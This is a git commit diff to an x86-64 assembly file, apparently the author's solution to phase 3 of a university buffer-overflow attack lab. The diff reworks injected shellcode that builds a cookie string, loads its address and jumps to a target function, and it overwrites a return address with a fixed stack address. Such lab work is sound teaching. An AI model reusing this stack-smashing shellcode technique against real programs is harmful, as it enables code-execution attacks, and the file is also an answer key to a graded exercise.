f0e4c0eaf69670fe714c35867bd24251d2e22608
nakido <nakidosama@outlook.com>
2023-03-27 20:39:12 +0800

    .

--- labs/3.target1/p3.asm
+++ labs/3.target1/p3.asm
@@ -1,16 +1,18 @@
 bits 64
 
-section buf start=0h vstart=5561DC78h
-buf:
-    mov [str_end], byte 0
-    mov rdi, str
+section shellcode start=0h vstart=5561DC78h
+shellcode_start:
+    mov rax, 6166373939623935h
+    mov qword [str], rax
+    xor eax, eax
+    mov byte [str+8], al
+    mov edi, str
     push qword 4018FAh
     ret
-str: ; TODO: move str to rsp+x
-    db '59b997fa'
-str_end:
-    times 8 db ' '
+    ; times 0 db ' ' ; 0x0 is also valid in file input
 
 section ret_addr start=28h vstart=5561DC78h+28h
 ret_addr:
-    dq buf
+    dq shellcode_start
+str: ; str need to be in rsp+x
+    resb 0h
